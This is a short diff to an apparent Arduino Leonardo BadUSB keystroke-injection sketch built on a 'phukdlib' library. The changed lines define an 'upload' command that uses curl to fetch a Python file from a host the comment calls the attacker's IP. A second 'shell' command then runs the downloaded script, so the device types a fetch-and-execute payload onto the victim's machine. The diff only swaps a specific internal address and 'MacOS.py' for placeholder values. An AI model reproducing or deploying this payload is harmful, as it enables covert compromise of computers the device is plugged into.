@@ -2,8 +2,8 @@
 #include <phukdlib_leonardo.h>
 
 
-#define upload "curl http://192.168.8.81:8081/test_mac/MacOS.py -o MacOS.py" // update attacker's IP, port, path to file and output file
-#define shell "python MacOS.py" // update .py filename (output file)
+#define upload "curl http://192.168.0.1:1337/path/to/file.py -o test.py" // update attacker's IP, port, path to file and output file
+#define shell "python test.py" // update .py filename (output file)
 
 void setup() {
   Keyboard.begin();
